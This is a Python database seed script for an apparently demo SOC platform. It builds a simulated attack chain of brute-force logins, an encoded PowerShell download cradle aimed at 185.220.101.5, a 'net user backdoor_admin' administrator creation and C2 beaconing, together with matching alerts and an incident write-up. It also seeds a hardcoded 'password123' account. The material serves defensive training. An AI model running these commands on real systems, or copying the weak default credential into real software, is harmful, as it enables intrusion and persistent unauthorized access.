from sqlalchemy.orm import Session
from datetime import datetime, timezone, timedelta
from app.core.security import get_password_hash
from app.models.all_models import (
    User, Event, Alert, Incident, Asset, Indicator, MitreTechnique, DetectionRule, Investigation, Report, ResponseAction
)

def seed_database(db: Session):
    # 1. Seed Default User if not exists
    if not db.query(User).filter(User.username == "analyst").first():
        user = User(
            username="analyst",
            email="analyst@sentinel.soc",
            password_hash=get_password_hash("password123"),
            role="SOC Analyst Tier 3 Lead"
        )
        db.add(user)

    # 2. Seed Assets
    if db.query(Asset).count() == 0:
        assets = [
            Asset(hostname="WORKSTATION-01", ip="192.168.1.50", operating_system="Windows 11 Enterprise", owner="Alex Chen", criticality="HIGH", risk_score=87.5, status="ACTIVE"),
            Asset(hostname="DC-PRIMARY-01", ip="10.0.0.1", operating_system="Windows Server 2022", owner="Domain Admins", criticality="CRITICAL", risk_score=95.0, status="ACTIVE"),
            Asset(hostname="SEC-SRV-01", ip="10.0.4.15", operating_system="Ubuntu 22.04 LTS", owner="SOC Team", criticality="HIGH", risk_score=40.0, status="ACTIVE"),
            Asset(hostname="WEB-GATEWAY-01", ip="10.0.0.10", operating_system="Debian 12 Nginx", owner="DevOps Team", criticality="MEDIUM", risk_score=25.0, status="ACTIVE"),
            Asset(hostname="FINANCE-PC-04", ip="192.168.1.104", operating_system="Windows 11 Pro", owner="Sarah Jenkins", criticality="HIGH", risk_score=15.0, status="ACTIVE")
        ]
        db.add_all(assets)

    # 3. Seed MITRE ATT&CK Techniques
    if db.query(MitreTechnique).count() == 0:
        mitre_list = [
            MitreTechnique(technique_id="T1110", name="Brute Force", tactic="Credential Access", description="Adversaries may use brute force mechanisms to gain access to valid accounts."),
            MitreTechnique(technique_id="T1059.001", name="PowerShell", tactic="Execution", description="Adversaries may abuse PowerShell commands and scripts for execution."),
            MitreTechnique(technique_id="T1136", name="Create Account", tactic="Persistence", description="Adversaries may create an account to maintain access to victim systems."),
            MitreTechnique(technique_id="T1071", name="Application Layer Protocol", tactic="Command and Control", description="Adversaries may communicate using application layer protocols to avoid detection."),
            MitreTechnique(technique_id="T1078", name="Valid Accounts", tactic="Defense Evasion", description="Adversaries may obtain and abuse credentials of existing accounts."),
            MitreTechnique(technique_id="T1041", name="Exfiltration Over C2 Channel", tactic="Exfiltration", description="Adversaries may exfiltrate data over an existing command and control channel.")
        ]
        db.add_all(mitre_list)

    # 4. Seed Indicators
    if db.query(Indicator).count() == 0:
        indicators = [
            Indicator(value="185.220.101.5", type="IP", reputation="MALICIOUS", confidence=98.0, threat_actor="APT29", indicator_metadata={"category": "C2 Server"}),
            Indicator(value="198.51.100.44", type="IP", reputation="SUSPICIOUS", confidence=75.0, threat_actor="Unknown Scanner", indicator_metadata={"category": "Recon"}),
            Indicator(value="malicious-c2-domain.com", type="domain", reputation="MALICIOUS", confidence=95.0, threat_actor="FIN7", indicator_metadata={"category": "Phishing"}),
            Indicator(value="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", type="hash", reputation="MALICIOUS", confidence=99.0, threat_actor="Cobalt Strike", indicator_metadata={"category": "Payload"})
        ]
        db.add_all(indicators)

    db.commit()

    # 5. Seed Primary Demo Scenario Telemetry Events (Attack Chain)
    if db.query(Event).count() == 0:
        base_time = datetime.now(timezone.utc) - timedelta(hours=2)
        demo_events = []

        # Step 1: 15 Failed Logins (Brute Force)
        for i in range(15):
            t = base_time + timedelta(seconds=i * 4)
            evt = Event(
                timestamp=t,
                source="windows",
                event_type="login_failure",
                hostname="WORKSTATION-01",
                username="admin",
                source_ip="192.168.1.50",
                destination_ip="10.0.0.1",
                process="lsass.exe",
                command_line="EventID: 4625 - Logon Type 3 - Failed password validation",
                raw_log=f'{{"EventID": 4625, "TimeCreated": "{t.isoformat()}", "TargetUserName": "admin", "IpAddress": "192.168.1.50", "Computer": "WORKSTATION-01", "SubStatus": "0xc000006a"}}'
            )
            demo_events.append(evt)

        # Step 2: Successful Login
        t_succ = base_time + timedelta(minutes=2)
        evt_succ = Event(
            timestamp=t_succ,
            source="windows",
            event_type="login_success",
            hostname="WORKSTATION-01",
            username="admin",
            source_ip="192.168.1.50",
            destination_ip="10.0.0.1",
            process="winlogon.exe",
            command_line="EventID: 4624 - Logon Type 10 (RDP) - Successful logon",
            raw_log=f'{{"EventID": 4624, "TimeCreated": "{t_succ.isoformat()}", "TargetUserName": "admin", "IpAddress": "192.168.1.50", "Computer": "WORKSTATION-01"}}'
        )
        demo_events.append(evt_succ)

        # Step 3: Encoded PowerShell Execution
        t_ps = base_time + timedelta(minutes=3)
        evt_ps = Event(
            timestamp=t_ps,
            source="windows",
            event_type="process_creation",
            hostname="WORKSTATION-01",
            username="admin",
            source_ip="192.168.1.50",
            destination_ip="10.0.0.1",
            process="powershell.exe",
            command_line="powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAAABMAADEAMAAxAC4ANQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
            raw_log=f'{{"EventID": 4688, "TimeCreated": "{t_ps.isoformat()}", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -EncodedCommand SQBFAFg...", "TargetUserName": "admin"}}'
        )
        demo_events.append(evt_ps)

        # Step 4: Privileged Account Creation
        t_acct = base_time + timedelta(minutes=4)
        evt_acct = Event(
            timestamp=t_acct,
            source="windows",
            event_type="account_creation",
            hostname="WORKSTATION-01",
            username="admin",
            source_ip="192.168.1.50",
            destination_ip="10.0.0.1",
            process="net.exe",
            command_line="net user backdoor_admin P@ssw0rd2026! /add && net localgroup Administrators backdoor_admin /add",
            raw_log=f'{{"EventID": 4720, "TimeCreated": "{t_acct.isoformat()}", "TargetUserName": "backdoor_admin", "SubjectUserName": "admin", "Computer": "WORKSTATION-01"}}'
        )
        demo_events.append(evt_acct)

        # Step 5: Outbound C2 Connection
        t_c2 = base_time + timedelta(minutes=5)
        evt_c2 = Event(
            timestamp=t_c2,
            source="web_server",
            event_type="network_connection",
            hostname="WORKSTATION-01",
            username="backdoor_admin",
            source_ip="192.168.1.50",
            destination_ip="185.220.101.5",
            process="powershell.exe",
            command_line="POST /api/v1/telemetry HTTP/1.1 (Host: 185.220.101.5:443)",
            raw_log=f'{{"timestamp": "{t_c2.isoformat()}", "source_ip": "192.168.1.50", "destination_ip": "185.220.101.5", "port": 443, "bytes_out": 542100}}'
        )
        demo_events.append(evt_c2)

        db.add_all(demo_events)
        db.commit()

        # 6. Create Seed Alerts
        alerts = [
            Alert(
                alert_id="ALT-1092",
                title="Brute Force Authentication Attempt",
                description="15 consecutive failed logon attempts (EventID 4625) detected targeting account 'admin' from host WORKSTATION-01.",
                severity="HIGH",
                status="New",
                source="DetectionEngine",
                detection_rule="Brute Force Detection",
                mitre_technique="T1110",
                event_count=15,
                risk_score=75.0
            ),
            Alert(
                alert_id="ALT-1093",
                title="Suspicious Encoded PowerShell Execution",
                description="PowerShell executed with -EncodedCommand flag under administrative context on WORKSTATION-01.",
                severity="CRITICAL",
                status="New",
                source="DetectionEngine",
                detection_rule="Suspicious PowerShell",
                mitre_technique="T1059.001",
                event_count=1,
                risk_score=92.0
            ),
            Alert(
                alert_id="ALT-1094",
                title="Privileged Account Creation",
                description="New local administrator account 'backdoor_admin' created via CLI on WORKSTATION-01.",
                severity="HIGH",
                status="New",
                source="DetectionEngine",
                detection_rule="Privileged Account Creation",
                mitre_technique="T1136",
                event_count=1,
                risk_score=80.0
            ),
            Alert(
                alert_id="ALT-1095",
                title="Suspicious Outbound Connection to C2 IP",
                description="Network socket opened to known threat actor IP 185.220.101.5 on TCP port 443.",
                severity="CRITICAL",
                status="New",
                source="DetectionEngine",
                detection_rule="Malicious Outbound Connection",
                mitre_technique="T1071",
                event_count=1,
                risk_score=98.0
            )
        ]
        db.add_all(alerts)
        db.commit()

        # 7. Create Seed Correlated Incident (INC-1042 / INC-8042)
        incident = Incident(
            incident_id="INC-8042",
            title="Suspected Administrator Account Compromise & C2 Exfiltration",
            description="Multi-stage compromise detected on WORKSTATION-01: credential brute-force, privilege escalation via obfuscated PowerShell, unauthorized administrator creation, and outbound beaconing to 185.220.101.5.",
            severity="CRITICAL",
            status="Investigating",
            risk_score=87.0,
            confidence=94.2,
            assigned_to="Alex Chen (Tier 3 Lead)"
        )
        db.add(incident)
        db.commit()
        db.refresh(incident)

        for a in alerts:
            incident.alerts.append(a)
        for e in demo_events:
            incident.events.append(e)

        # 8. Add Seed Investigation
        investigation = Investigation(
            incident_id=incident.id,
            ai_summary="Autonomous correlation pipeline identified multi-stage attack chain targeting WORKSTATION-01. Initial access acquired via RDP brute force, followed by obfuscated PowerShell execution, backdoor user creation, and active C2 communication.",
            confidence=94.2,
            findings={
                "evidence_analysis": [
                    "[OBSERVED EVIDENCE] 15 consecutive login failure events (4625) recorded from IP 192.168.1.50.",
                    "[OBSERVED EVIDENCE] 1 successful authentication event (4624) for user 'admin' immediately following brute force sequence.",
                    "[OBSERVED EVIDENCE] Process creation powershell.exe containing flag '-EncodedCommand'.",
                    "[OBSERVED EVIDENCE] Account creation event 4720 creating user 'backdoor_admin'.",
                    "[OBSERVED EVIDENCE] Outbound TCP socket connection to external IP 185.220.101.5."
                ],
                "attack_hypothesis": "Adversary conducted credential brute-forcing targeting RDP/SMB. Upon acquiring valid credentials, adversary leveraged PowerShell for persistence and C2 beaconing.",
                "false_positives": [
                    "Authorized administrative maintenance script performing remote management with encoded parameters."
                ]
            },
            recommendations={
                "recommended_investigation": [
                    "Query EDR telemetry for child processes spawned by powershell.exe.",
                    "Inspect memory dump of WORKSTATION-01 for injected DLLs."
                ],
                "recommended_response": [
                    "Isolate WORKSTATION-01 from local network subnet.",
                    "Disable compromised user account 'admin' and 'backdoor_admin'.",
                    "Block outbound IP 185.220.101.5 on firewall."
                ]
            }
        )
        db.add(investigation)

        # 9. Add Seed Response Action
        resp_act = ResponseAction(
            incident_id=incident.id,
            action="isolate_endpoint",
            status="SIMULATED",
            target="WORKSTATION-01",
            details="Simulated endpoint network isolation triggered by analyst."
        )
        db.add(resp_act)

        db.commit()
